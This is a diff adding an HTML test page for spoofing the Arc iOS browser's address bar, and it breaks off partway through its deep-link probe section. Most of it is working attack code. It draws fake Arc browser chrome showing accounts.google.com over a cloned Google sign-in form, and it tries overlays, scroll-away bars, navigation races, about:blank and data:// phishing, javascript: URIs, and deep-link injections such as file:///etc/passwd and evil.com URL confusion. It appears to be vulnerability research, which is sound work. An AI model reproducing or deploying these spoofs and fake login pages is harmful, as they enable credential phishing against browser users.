@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Arc iOS Spoof v2</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-touch-callout: none; -webkit-user-select: none; }
+body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #0d1117; color: #c9d1d9; overflow-x: hidden; }
+.hdr { background: #161b22; padding: 15px; border-bottom: 1px solid #30363d; }
+h1 { font-size: 16px; color: #58a6ff; }
+.sub { font-size: 11px; color: #8b949e; margin-top: 4px; }
+.tests { padding: 12px; }
+.card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 10px; padding: 12px; }
+.tid { color: #f0883e; font-weight: bold; font-size: 13px; }
+.tdesc { color: #8b949e; font-size: 11px; margin: 4px 0; }
+.tech { color: #7ee787; font-size: 10px; font-family: monospace; background: #0d1117; padding: 3px 6px; border-radius: 3px; display: inline-block; margin: 3px 0; }
+button { background: #238636; color: white; border: none; padding: 10px; border-radius: 6px; font-size: 13px; width: 100%; margin-top: 6px; cursor: pointer; -webkit-tap-highlight-color: transparent; }
+button:active { opacity: 0.8; }
+.orange { background: #d29922; }
+.red { background: #da3633; }
+.purple { background: #8957e5; }
+#log { background: #0d1117; margin: 12px; padding: 10px; border-radius: 6px; font-size: 10px; font-family: monospace; max-height: 200px; overflow-y: auto; display: none; }
+.log-line { margin: 2px 0; color: #7ee787; }
+.log-err { color: #f85149; }
+</style>
+</head>
+<body>
+
+<div class="hdr">
+  <h1>Arc iOS Address Bar Spoof v2</h1>
+  <div class="sub">iOS-specific techniques — no Fullscreen API or popup dependency</div>
+</div>
+
+<div class="tests">
+
+<!-- ================================================ -->
+<!-- A1: Video Fullscreen Overlay (iOS native FS) -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">A1 — Video Fullscreen + Overlay</div>
+  <div class="tdesc">iOS only supports fullscreen on &lt;video&gt; elements. Enter video fullscreen, then overlay fake UI via CSS. When video goes fullscreen, DOM overlay may persist.</div>
+  <div class="tech">video.webkitEnterFullscreen() + CSS position:fixed overlay</div>
+  <button onclick="testVideoFS()">Launch A1</button>
+</div>
+
+<!-- ================================================ -->
+<!-- A2: Scroll-away Address Bar + Fake Bar -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">A2 — Scroll-Away Address Bar Replacement</div>
+  <div class="tdesc">On iOS, scrolling down hides the real address bar. Create tall page that auto-scrolls, then position a fake address bar at the top. User sees fake bar instead of real one.</div>
+  <div class="tech">window.scrollTo() + position:fixed fake bar + 100vh spacer</div>
+  <button onclick="testScrollSpoof()">Launch A2</button>
+</div>
+
+<!-- ================================================ -->
+<!-- B1: Navigation Race — location + setTimeout DOM -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">B1 — Navigation + Immediate DOM Rewrite</div>
+  <div class="tdesc">Navigate to target, then immediately overwrite document. On some browsers the address bar updates before navigation completes and DOM write cancels navigation.</div>
+  <div class="tech">location.href = target; setTimeout(document.write, 0)</div>
+  <button onclick="testNavRace1()">Launch B1</button>
+</div>
+
+<!-- ================================================ -->
+<!-- B2: Navigation Race — meta refresh cancel -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">B2 — Meta Refresh Race</div>
+  <div class="tdesc">Inject meta refresh pointing to target URL with 0 delay, then immediately call window.stop(). Address bar may update while stop() prevents actual navigation.</div>
+  <div class="tech">meta http-equiv=refresh + window.stop()</div>
+  <button onclick="testMetaRefresh()">Launch B2</button>
+</div>
+
+<!-- ================================================ -->
+<!-- B3: Navigation Race — form POST -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">B3 — Form POST + Slow Response</div>
+  <div class="tdesc">Submit a form via POST to target URL. Some browsers update address bar on form submit before response. If target is slow/unreachable, content stays.</div>
+  <div class="tech">form.action = target; form.submit() + unreachable target</div>
+  <button onclick="testFormPost()">Launch B3</button>
+</div>
+
+<!-- ================================================ -->
+<!-- B4: setInterval location race -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">B4 — setInterval Location Hammer</div>
+  <div class="tdesc">Rapidly alternate between target URL and current page using setInterval. May catch a frame where address bar shows target but content is attacker-controlled.</div>
+  <div class="tech">setInterval(location.href = target + window.stop(), 1)</div>
+  <button class="orange" onclick="testIntervalRace()">Launch B4</button>
+</div>
+
+<!-- ================================================ -->
+<!-- C1: about:blank Window Write -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">C1 — about:blank Content Injection</div>
+  <div class="tdesc">Open about:blank or about:srcdoc, then document.write full phishing page. Check how Arc displays the URL for about: pages.</div>
+  <div class="tech">window.open("about:blank").document.write(phishing)</div>
+  <button onclick="testAboutBlank()">Launch C1</button>
+</div>
+
+<!-- ================================================ -->
+<!-- C2: data: URL with authority -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">C2 — Data URL with Fake Authority</div>
+  <div class="tdesc">Open data URL using authority syntax: data://domain.com/,content. Some browsers display the authority in address bar (Opera Bug #1 variant).</div>
+  <div class="tech">data://accounts.google.com/,html_content</div>
+  <button onclick="testDataAuthority()">Launch C2</button>
+</div>
+
+<!-- ================================================ -->
+<!-- D1: iframe + top navigation timing -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">D1 — iframe Sandbox Navigation Race</div>
+  <div class="tdesc">Create sandboxed iframe with allow-top-navigation. iframe navigates top to target URL. Parent uses beforeunload/pagehide to write DOM before navigation completes.</div>
+  <div class="tech">iframe sandbox=allow-top-navigation + beforeunload DOM write</div>
+  <button onclick="testIframeNav()">Launch D1</button>
+</div>
+
+<!-- ================================================ -->
+<!-- D2: srcdoc iframe overlay -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">D2 — Full-page iframe Overlay</div>
+  <div class="tdesc">Create a full-screen iframe covering entire viewport including where address bar was. Combined with scroll-away technique to hide real bar.</div>
+  <div class="tech">iframe srcdoc with position:fixed covering viewport</div>
+  <button onclick="testIframeOverlay()">Launch D2</button>
+</div>
+
+<!-- ================================================ -->
+<!-- E1: JavaScript URI in various contexts -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">E1 — JavaScript: URI Contexts</div>
+  <div class="tdesc">Test javascript: scheme in link clicks, form actions, meta refresh, iframe src. Check which contexts Arc allows execution and how address bar displays.</div>
+  <div class="tech">javascript: in href, formaction, meta refresh</div>
+  <button onclick="testJSURI()">Launch E1</button>
+</div>
+
+<!-- ================================================ -->
+<!-- F1: Universal Links / Deep Links -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">F1 — Arc Universal Links Probe</div>
+  <div class="tdesc">Test Arc-specific deep links and universal links. Probe for URL parameters that Arc handles internally.</div>
+  <div class="tech">arc://, arc-search://, AASA check</div>
+  <button class="purple" onclick="testUniversalLinks()">Launch F1</button>
+</div>
+
+<!-- ================================================ -->
+<!-- F2: Web App Manifest + Display Standalone -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">F2 — PWA Display Standalone</div>
+  <div class="tdesc">Add-to-homescreen PWA with display:standalone hides browser UI. If Arc supports PWA install, full UI control is possible.</div>
+  <div class="tech">manifest.json display:standalone + theme-color</div>
+  <button onclick="testPWA()">Launch F2</button>
+</div>
+
+<!-- ================================================ -->
+<!-- G1: WebSocket/SSE Stall -->
+<!-- ================================================ -->
+<div class="card">
+  <div class="tid">G1 — Pending Navigation + WebSocket Stall</div>
+  <div class="tdesc">Start navigation to target, keep connection alive via chunked transfer / SSE. Browser shows target URL but response never completes, attacker content persists.</div>
+  <div class="tech">EventSource to slow server + location change</div>
+  <button onclick="testSSEStall()">Launch G1</button>
+</div>
+
+</div>
+
+<div id="log"></div>
+<button style="margin:12px;width:calc(100% - 24px);background:#30363d;" onclick="document.getElementById('log').style.display='block';">Show Debug Log</button>
+
+<script>
+// ============================================
+// Logging
+// ============================================
+function log(msg, err) {
+  let d = document.getElementById('log');
+  d.style.display = 'block';
+  let e = document.createElement('div');
+  e.className = err ? 'log-line log-err' : 'log-line';
+  e.textContent = new Date().toLocaleTimeString() + ' ' + msg;
+  d.appendChild(e);
+  d.scrollTop = d.scrollHeight;
+}
+
+// ============================================
+// Fake Arc iOS UI Components
+// ============================================
+function arcStatusBar() {
+  return '<div style="height:env(safe-area-inset-top,54px);min-height:44px;background:#fff;display:flex;align-items:flex-end;justify-content:space-between;padding:0 20px 4px;font-size:15px;font-weight:600;font-family:-apple-system,sans-serif;color:#000;">' +
+    '<span>9:41</span><span style="display:flex;gap:4px;align-items:center;font-size:13px;">5G &#x1F50B;</span></div>';
+}
+
+function arcAddressBar(url) {
+  return '<div style="height:36px;background:#f2f2f7;margin:4px 16px 8px;border-radius:10px;display:flex;align-items:center;padding:0 12px;font-size:14px;font-family:-apple-system,sans-serif;">' +
+    '<svg width="10" height="12" viewBox="0 0 24 24" fill="none" stroke="#34c759" stroke-width="3" style="flex-shrink:0;"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>' +
+    '&nbsp;&nbsp;<span style="color:#1d1d1f;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">' + url + '</span></div>';
+}
+
+function arcBottomBar() {
+  return '<div style="position:fixed;bottom:0;left:0;right:0;height:calc(50px + env(safe-area-inset-bottom,0px));background:#f9f9f9;border-top:0.5px solid #c6c6c8;display:flex;align-items:center;justify-content:space-around;padding:0 10px;z-index:100000;">' +
+    '<span style="font-size:22px;">&#x25C0;</span>' +
+    '<span style="font-size:22px;">&#x25B6;</span>' +
+    '<span style="font-size:22px;">&#x2B06;</span>' +
+    '<span style="font-size:22px;">&#x2750;</span>' +
+    '<span style="font-size:22px;">&#x2630;</span></div>';
+}
+
+function loginPage(domain) {
+  return '<div style="font-family:-apple-system,sans-serif;max-width:360px;margin:40px auto;padding:20px;text-align:center;">' +
+    '<div style="width:56px;height:56px;background:linear-gradient(135deg,#4285f4,#34a853);border-radius:14px;margin:0 auto 16px;display:flex;align-items:center;justify-content:center;">' +
+    '<span style="color:white;font-size:24px;font-weight:700;">G</span></div>' +
+    '<h2 style="color:#1d1d1f;font-size:20px;margin-bottom:6px;">Sign in</h2>' +
+    '<p style="color:#86868b;font-size:13px;margin-bottom:24px;">to continue to ' + domain + '</p>' +
+    '<input type="email" placeholder="Email or phone" style="width:100%;padding:11px 14px;border:1px solid #d2d2d7;border-radius:8px;font-size:16px;margin-bottom:10px;outline:none;-webkit-appearance:none;">' +
+    '<input type="password" placeholder="Password" style="width:100%;padding:11px 14px;border:1px solid #d2d2d7;border-radius:8px;font-size:16px;margin-bottom:18px;outline:none;-webkit-appearance:none;">' +
+    '<button style="width:100%;padding:11px;background:#1a73e8;color:white;border:none;border-radius:8px;font-size:16px;font-weight:600;">Next</button>' +
+    '<p style="color:#1a73e8;font-size:12px;margin-top:14px;">Forgot email?</p>' +
+    '<p style="color:#86868b;font-size:11px;margin-top:20px;">Not your device? Use Guest mode to sign in privately.</p></div>';
+}
+
+
+// ============================================
+// A1: Video Fullscreen + Overlay
+// ============================================
+function testVideoFS() {
+  log('A1: Creating video element for iOS fullscreen...');
+
+  // Create a minimal video that can play inline
+  let container = document.createElement('div');
+  container.id = 'a1-container';
+  container.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#000;';
+
+  // Small transparent video (1x1 pixel, will be overlaid)
+  let video = document.createElement('video');
+  video.setAttribute('playsinline', '');
+  video.setAttribute('webkit-playsinline', '');
+  video.setAttribute('autoplay', '');
+  video.setAttribute('muted', '');
+  video.muted = true;
+  video.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;z-index:1;';
+
+  // Use a small inline video source (blank)
+  video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQAAAAhtZGF0AAAA0m1vb3YAAABsbXZoZAAAAAAAAAAAAAAAAAAAA+gAAAAAAAEAAAEAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAABidWR0YQAAAFptZXRhAAAAIWhkbHIAAAAAAAAAAG1kaXJhcHBsAAAAAAAAAAAAAAAALWlsc3QAAAAlqXRvbwAAAB1kYXRhAAAAAQAAAABMYXZmNTguNDUuMTAw';
+
+  // Overlay with fake UI
+  let overlay = document.createElement('div');
+  overlay.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;background:#fff;overflow-y:auto;';
+  overlay.innerHTML = arcStatusBar() + arcAddressBar('accounts.google.com') + loginPage('Google') + arcBottomBar();
+
+  container.appendChild(video);
+  container.appendChild(overlay);
+  document.body.appendChild(container);
+
+  video.play().then(function() {
+    log('A1: Video playing, attempting webkitEnterFullscreen...');
+    try {
+      if (video.webkitEnterFullscreen) {
+        video.webkitEnterFullscreen();
+        log('A1: webkitEnterFullscreen called');
+      } else if (video.requestFullscreen) {
+        video.requestFullscreen();
+        log('A1: requestFullscreen called');
+      } else {
+        log('A1: No fullscreen API — showing overlay only', true);
+      }
+    } catch(e) {
+      log('A1: Fullscreen error: ' + e.message, true);
+    }
+  }).catch(function(e) {
+    log('A1: Video play failed: ' + e.message + ' — showing overlay anyway', true);
+  });
+
+  // Tap overlay to exit
+  overlay.addEventListener('click', function(e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'BUTTON') return;
+    container.remove();
+    try { document.exitFullscreen(); } catch(ex){}
+    try { document.webkitExitFullscreen(); } catch(ex){}
+    log('A1: Overlay removed');
+  });
+}
+
+
+// ============================================
+// A2: Scroll-Away Address Bar
+// ============================================
+function testScrollSpoof() {
+  log('A2: Creating scroll-spoof page...');
+
+  let page = document.createElement('div');
+  page.id = 'a2-page';
+  page.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#fff;overflow-y:scroll;-webkit-overflow-scrolling:touch;';
+
+  // Tall spacer to enable scrolling and hide real address bar
+  let spacer = document.createElement('div');
+  spacer.style.height = '200vh';
+  spacer.style.background = '#fff';
+
+  // Fake Arc UI positioned after scroll
+  let fakeUI = document.createElement('div');
+  fakeUI.style.cssText = 'position:sticky;top:0;z-index:100;background:#fff;';
+  fakeUI.innerHTML = arcStatusBar() + arcAddressBar('accounts.google.com');
+
+  // Content
+  let content = document.createElement('div');
+  content.innerHTML = loginPage('Google') + arcBottomBar() +
+    '<p style="text-align:center;color:red;font-size:11px;margin:20px;padding-bottom:80px;">Spoof test — real address bar should be hidden above.<br>Tap background 3x to exit.</p>';
+
+  page.appendChild(spacer);
+  page.appendChild(fakeUI);
+  page.appendChild(content);
+  document.body.appendChild(page);
+
+  // Auto-scroll to hide real address bar
+  setTimeout(function() {
+    page.scrollTo({ top: window.innerHeight + 100, behavior: 'smooth' });
+    log('A2: Auto-scrolled to hide real address bar');
+  }, 300);
+
+  // Second scroll to really push it away
+  setTimeout(function() {
+    page.scrollTo({ top: window.innerHeight * 1.5, behavior: 'smooth' });
+  }, 800);
+
+  let tapCount = 0;
+  page.addEventListener('click', function(e) {
+    if (e.target.tagName === 'INPUT' || e.target.tagName === 'BUTTON') return;
+    tapCount++;
+    if (tapCount >= 3) { page.remove(); log('A2: Removed'); }
+  });
+}
+
+
+// ============================================
+// B1: Navigation + DOM Rewrite
+// ============================================
+function testNavRace1() {
+  log('B1: Opening race test...');
+  let w = window.open('about:blank');
+  if (!w) {
+    // iOS fallback: navigate current page
+    log('B1: Popup blocked, testing in current page...');
+    let originalContent = document.documentElement.outerHTML;
+
+    window.location.href = 'https://accounts.google.com/signin';
+    // Try to rewrite before navigation completes
+    setTimeout(function() {
+      try {
+        document.open();
+        document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;font-family:-apple-system,sans-serif;background:#fff;">' +
+          '<div style="text-align:center;padding:60px 20px;"><h2>B1 Race Test</h2><p style="color:#666;">If address bar shows accounts.google.com but you see this page = SPOOFED</p><p style="color:#666;">If you see Google login = race lost (normal)</p></div></body></html>');
+        document.close();
+      } catch(e) {}
+    }, 0);
+    return;
+  }
+
+  w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;font-family:-apple-system,sans-serif;"><div style="text-align:center;padding:40px;"><p>Starting race in 1s...</p></div><script>' +
+    'setTimeout(function(){' +
+    '  window.location.href="https://accounts.google.com/signin";' +
+    '  setTimeout(function(){' +
+    '    try{document.open();document.write("<!DOCTYPE html><html><head><meta name=viewport content=width=device-width,initial-scale=1></head><body style=margin:0;font-family:-apple-system,sans-serif;background:#fff;><div style=text-align:center;padding:60px><h2>B1 RACE TEST</h2><p style=color:#666>Address bar shows google.com? = SPOOFED</p><p style=color:#666>Shows this page = race condition triggered</p></div></body></html>");document.close();}catch(e){}' +
+    '  },0);' +
+    '},1000);' +
+    '<\/script></body></html>');
+  w.document.close();
+}
+
+
+// ============================================
+// B2: Meta Refresh Race
+// ============================================
+function testMetaRefresh() {
+  log('B2: Testing meta refresh race...');
+  let w = window.open('about:blank');
+  if (!w) {
+    log('B2: Popup blocked, using iframe fallback', true);
+    let iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:none;';
+    iframe.srcdoc = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="0;url=https://accounts.google.com/"></head><body style="margin:0;font-family:-apple-system,sans-serif;"><script>window.stop();<\/script><div style="text-align:center;padding:60px;"><h2>B2 Meta Refresh</h2><p>If navigation stopped but bar updated = SPOOFED</p></div></body></html>';
+    document.body.appendChild(iframe);
+    iframe.addEventListener('click', function() { iframe.remove(); });
+    return;
+  }
+
+  w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">' +
+    '<meta http-equiv="refresh" content="0;url=https://accounts.google.com/signin">' +
+    '</head><body style="margin:0;font-family:-apple-system,sans-serif;background:#fff;">' +
+    '<script>window.stop();<\/script>' +
+    '<div style="text-align:center;padding:60px;">' +
+    '<h2>B2 — Meta Refresh Race</h2>' +
+    '<p style="color:#666;">Meta refresh pointed to accounts.google.com</p>' +
+    '<p style="color:#666;">window.stop() called immediately</p>' +
+    '<p style="color:green;font-weight:bold;margin-top:20px;">Check address bar — what does it show?</p>' +
+    '</div></body></html>');
+  w.document.close();
+}
+
+
+// ============================================
+// B3: Form POST + Unreachable Target
+// ============================================
+function testFormPost() {
+  log('B3: Testing form POST navigation...');
+
+  let form = document.createElement('form');
+  form.method = 'POST';
+  form.target = '_blank';
+  // POST to target - address bar may update before response
+  form.action = 'https://accounts.google.com/signin';
+
+  let input = document.createElement('input');
+  input.type = 'hidden';
+  input.name = 'continue';
+  input.value = 'test';
+  form.appendChild(input);
+
+  document.body.appendChild(form);
+  form.submit();
+  form.remove();
+
+  log('B3: Form submitted to accounts.google.com via POST');
+}
+
+
+// ============================================
+// B4: setInterval Location Hammer
+// ============================================
+function testIntervalRace() {
+  log('B4: Starting location hammer...');
+
+  let count = 0;
+  let maxTries = 50;
+  let originalHTML = '<div style="font-family:-apple-system,sans-serif;text-align:center;padding:60px;background:#fff;min-height:100vh;"><h2>B4 — Interval Race</h2><p style="color:#666;">If you see this AND address bar shows google.com = SPOOFED</p><p id="counter" style="color:#999;margin-top:20px;"></p></div>';
+
+  let interval = setInterval(function() {
+    count++;
+    if (count > maxTries) {
+      clearInterval(interval);
+      log('B4: Stopped after ' + maxTries + ' attempts');
+      return;
+    }
+
+    try {
+      window.location.href = 'https://accounts.google.com/signin';
+      window.stop();
+
+      // Try to restore content
+      setTimeout(function() {
+        try {
+          if (document.body) {
+            document.body.innerHTML = originalHTML;
+            let c = document.getElementById('counter');
+            if (c) c.textContent = 'Attempt: ' + count + '/' + maxTries;
+          }
+        } catch(e) {}
+      }, 0);
+    } catch(e) {
+      clearInterval(interval);
+      log('B4: Error at attempt ' + count + ': ' + e.message, true);
+    }
+  }, 100);
+
+  // Safety: stop after 6 seconds
+  setTimeout(function() {
+    clearInterval(interval);
+    log('B4: Safety timeout — stopped');
+  }, 6000);
+}
+
+
+// ============================================
+// C1: about:blank Window Write
+// ============================================
+function testAboutBlank() {
+  log('C1: Opening about:blank...');
+
+  let w = window.open('about:blank');
+  if (!w) {
+    log('C1: Popup blocked — trying location method', true);
+    // Try alternative: navigate to about:blank in current tab
+    window.location = 'about:blank';
+    setTimeout(function() {
+      try {
+        document.open();
+        document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;background:#fff;">' +
+          arcStatusBar() + arcAddressBar('accounts.google.com') + loginPage('Google') +
+          '<p style="text-align:center;color:red;font-size:11px;margin-top:20px;">C1: about:blank — check real address bar above</p></body></html>');
+        document.close();
+      } catch(e) {}
+    }, 100);
+    return;
+  }
+
+  // Write full phishing page into about:blank
+  w.document.open();
+  w.document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;background:#fff;">' +
+    '<div style="text-align:center;padding:30px;">' +
+    '<h3 style="color:#1d1d1f;">C1 — about:blank Test</h3>' +
+    '<p style="color:#86868b;font-size:13px;">Check address bar: does it show about:blank, blank, or nothing?</p>' +
+    '<p style="color:#86868b;font-size:13px;">If address bar is empty/hidden, this can be used for phishing.</p>' +
+    '</div>' +
+    loginPage('Google') +
+    '</body></html>');
+  w.document.close();
+  log('C1: Wrote phishing content to about:blank');
+}
+
+
+// ============================================
+// C2: Data URL with Authority
+// ============================================
+function testDataAuthority() {
+  log('C2: Testing data URL variants...');
+
+  let urls = [
+    'data://accounts.google.com/,<h1>Authority Spoof Test</h1><p>Check address bar</p>',
+    'data:text/html;base64,' + btoa('<html><body style="font-family:sans-serif;text-align:center;padding:40px;"><h2>C2 Data URL</h2><p>Does address bar show data: prefix?</p><p>Or is it hidden/truncated?</p></body></html>'),
+  ];
+
+  // Try the authority syntax first (Opera Bug #1 style)
+  let link = document.createElement('a');
+  link.href = urls[0];
+  link.target = '_blank';
+  link.click();
+
+  log('C2: Opened data:// with authority syntax');
+
+  // Also try standard data URL after delay
+  setTimeout(function() {
+    let link2 = document.createElement('a');
+    link2.href = urls[1];
+    link2.target = '_blank';
+    link2.click();
+    log('C2: Opened standard data:text/html base64');
+  }, 2000);
+}
+
+
+// ============================================
+// D1: iframe Sandbox Navigation
+// ============================================
+function testIframeNav() {
+  log('D1: Testing iframe sandbox navigation...');
+
+  // Set up beforeunload handler to catch navigation
+  window.addEventListener('beforeunload', function(e) {
+    // Try to prevent and rewrite
+    e.preventDefault();
+    e.returnValue = '';
+  }, { once: true });
+
+  // Create iframe that will try to navigate top
+  let iframe = document.createElement('iframe');
+  iframe.sandbox = 'allow-scripts allow-top-navigation';
+  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;border:none;';
+  iframe.srcdoc = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="margin:0;font-family:-apple-system,sans-serif;background:#fff;">' +
+    '<div style="text-align:center;padding:60px;">' +
+    '<h2>D1 — iframe Navigation Race</h2>' +
+    '<p style="color:#666;">iframe will try to navigate top to google.com in 2 seconds...</p>' +
+    '<p style="color:#666;">If beforeunload prevents it, content stays but bar may update.</p>' +
+    '</div>' +
+    '<script>' +
+    'setTimeout(function(){' +
+    '  top.location = "https://accounts.google.com/signin";' +
+    '}, 2000);' +
+    '<\/script></body></html>';
+
+  document.body.appendChild(iframe);
+
+  // Safety cleanup
+  setTimeout(function() {
+    if (document.body.contains(iframe)) iframe.remove();
+  }, 10000);
+}
+
+
+// ============================================
+// D2: Full-page iframe Overlay
+// ============================================
+function testIframeOverlay() {
+  log('D2: Creating full-page iframe overlay...');
+
+  let iframe = document.createElement('iframe');
+  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;border:none;background:#fff;';
+  iframe.srcdoc = '<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"></head><body style="margin:0;background:#fff;overflow-y:scroll;-webkit-overflow-scrolling:touch;">' +
+    '<div style="height:150vh;"></div>' + // Spacer to enable scroll
+    '<div style="position:sticky;top:0;background:#fff;z-index:100;">' +
+    arcStatusBar() + arcAddressBar('accounts.google.com') +
+    '</div>' +
+    loginPage('Google') +
+    '<p style="text-align:center;color:red;font-size:11px;margin:20px;">D2: iframe overlay — tap 3x on background to exit</p>' +
+    arcBottomBar() +
+    '<script>' +
+    'var tc=0;document.addEventListener("click",function(e){if(e.target.tagName!="INPUT"&&e.target.tagName!="BUTTON"){tc++;if(tc>=3)parent.postMessage("remove-d2","*");}});' +
+    // Auto-scroll to hide any top bar
+    'setTimeout(function(){window.scrollTo(0,window.innerHeight);},300);' +
+    '<\/script></body></html>';
+
+  document.body.appendChild(iframe);
+
+  window.addEventListener('message', function handler(e) {
+    if (e.data === 'remove-d2') {
+      iframe.remove();
+      window.removeEventListener('message', handler);
+      log('D2: Removed');
+    }
+  });
+}
+
+
+// ============================================
+// E1: JavaScript URI Contexts
+// ============================================
+function testJSURI() {
+  log('E1: Testing javascript: URI in various contexts...');
+
+  let testPage = document.createElement('div');
+  testPage.id = 'e1-page';
+  testPage.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0d1117;overflow-y:auto;padding:20px;';
+
+  let tests = [
+    { desc: 'Link href click', html: '<a href="javascript:void(document.title=\'E1-LINK-XSS\')" style="color:#58a6ff;font-size:14px;display:block;padding:10px;">Tap: javascript: in href</a>' },
+    { desc: 'Link href (encoded)', html: '<a href="&#106;avascript:void(document.title=\'E1-ENCODED\')" style="color:#58a6ff;font-size:14px;display:block;padding:10px;">Tap: HTML-encoded javascript:</a>' },
+    { desc: 'Form action', html: '<form action="javascript:void(document.title=\'E1-FORM\')"><button type="submit" style="color:#58a6ff;font-size:14px;background:none;border:1px solid #30363d;padding:10px;border-radius:6px;width:100%;">Tap: form action javascript:</button></form>' },
+    { desc: 'Window.location (button)', html: '<button onclick="window.location=\'javascript:void(document.title=\\\'E1-LOCATION\\\')\'" style="color:#58a6ff;font-size:14px;background:none;border:1px solid #30363d;padding:10px;border-radius:6px;width:100%;">Tap: location = javascript:</button>' },
+    { desc: 'Meta refresh (auto)', html: '<div style="color:#f0883e;font-size:12px;padding:10px;">Meta refresh with javascript: tested on load (check title)</div>' },
+    { desc: 'iframe src', html: '<iframe src="javascript:parent.document.title=\'E1-IFRAME\'" style="width:100%;height:40px;border:1px solid #30363d;"></iframe><div style="color:#8b949e;font-size:11px;padding:5px;">iframe src=javascript:</div>' },
+  ];
+
+  let html = '<div style="color:#f0883e;font-size:16px;font-weight:bold;margin-bottom:15px;">E1 — javascript: URI Tests</div>' +
+    '<div style="color:#8b949e;font-size:11px;margin-bottom:15px;">After tapping each, check document.title in console.<br>If title changed = javascript: executed in that context.</div>';
+
+  tests.forEach(function(t) {
+    html += '<div style="margin-bottom:10px;padding:10px;background:#161b22;border-radius:8px;">' +
+      '<div style="color:#8b949e;font-size:10px;margin-bottom:4px;">' + t.desc + '</div>' +
+      t.html + '</div>';
+  });
+
+  html += '<button onclick="this.parentElement.remove();" style="margin-top:10px;background:#da3633;">Close Tests</button>';
+
+  testPage.innerHTML = html;
+  document.body.appendChild(testPage);
+}
+
+
+// ============================================
+// F1: Universal Links Probe
+// ============================================
+function testUniversalLinks() {
+  log('F1: Probing Arc deep links...');
+
+  let container = document.createElement('div');
+  container.id = 'f1-page';
+  container.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:#0d1117;overflow-y:auto;padding:20px;';
+
+  let schemes = [
+    { url: 'arc://open?url=https://accounts.google.com', desc: 'arc://open?url=' },
+    { url: 'arc-search://hello%20world', desc: 'arc-search://' },
+    { url: 'arc://newtab', desc: 'arc://newtab' },
+    { url: 'arc://settings', desc: 'arc://settings' },
+    { url: 'arc://flags', desc: 'arc://flags' },
+    { url: 'arc://version', desc: 'arc://version' },
+    { url: 'arc://inspect', desc: 'arc://inspect' },
+    { url: 'arc://open?url=data:text/html,<h1>injected</h1>', desc: 'arc:// + data: URL injection' },
+    { url: 'arc://open?url=javascript:alert(document.domain)', desc: 'arc:// + javascript: injection' },
+    { url: 'arc://open?url=file:///etc/passwd', desc: 'arc:// + file: scheme' },
+    { url: 'x-]]callback-arc://open', desc: 'x-callback-arc://' },
+    { url: 'https://arc.net/open?url=https://accounts.google.com', desc: 'arc.net universal link' },
+    { url: 'https://arc.net/.well-known/apple-app-site-association', desc: 'AASA file (see if accessible)' },
+    { url: 'arc://open?url=https://accounts.google.com%00.evil.com', desc: 'null byte in URL' },
+    { url: 'arc://open?url=https://accounts.google.com%23.evil.com', desc: '# fragment injection' },
+    { url: 'arc://open?url=https://evil.com%40accounts.google.com', desc: '@ authority confusion' },
+  ];
+
+  let html = '<div style="color:#8957e5;font-size:16px;font-weight:bold;margin-bottom:10px;">F1 — Arc Deep Link Probing</div>' +
+    '<div style="color:#8b949e;font-size:11px;margin-bottom:15px;">Tap each link. Note:<br>- Which ones open inside Arc?<br>- Does address bar change?<br>- Any error or crash?</div>';
+
+  schemes.forEach(function(s) {
+    html += '<div style="margin-bottom:8px;padding:8px;background:#161b22;border-radius:6px;">' +
+      '<div style="color:#8b949e;font-size:10px;">' + s.desc + '</div>' +
